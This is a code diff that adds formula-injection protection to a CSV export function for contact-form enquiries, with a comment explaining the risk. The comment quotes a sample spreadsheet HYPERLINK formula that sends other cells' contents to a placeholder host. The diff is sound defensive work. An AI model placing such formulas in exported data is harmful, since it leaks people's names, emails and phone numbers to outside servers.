@@ -119,8 +119,26 @@
     return isNaN(+d) ? String(v) : d.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
   }
   function csv(rows, cols) {
+    /* A STRANGER WRITES MOST OF THESE CELLS, and this file is opened in Excel.
+       name, subject, message and phone come off the public contact form and go
+       straight into `enquiries` through the anonymous insert the forms depend
+       on. Excel and Google Sheets evaluate any cell that OPENS with =, +, - or
+       @ as a formula, so `=HYPERLINK("https://x/?q="&C2&D2,"your enquiry")` in
+       a name field is one click away from sending every other enquirer's name,
+       email and telephone number to somebody else's server - a breach of the
+       club's lead data, caused by somebody filling in a form.
+
+       THE QUOTING BELOW IS CORRECT CSV AND IS NO DEFENCE AT ALL. A parser
+       unescapes it back to the original string and the spreadsheet reads the
+       leading = afterwards. The prefix has to go on before the quoting, or it
+       would be testing the quote mark it just added.
+
+       A leading apostrophe is what makes a spreadsheet read a cell as text. It
+       costs a plain-text reader one visible character and it is the right
+       trade, because it also stops Excel mangling a +44 telephone number. */
     var q = function (v) {
       var s = v == null ? '' : String(v);
+      if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
       return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
     };
     return [cols.join(',')].concat(rows.map(function (r) {
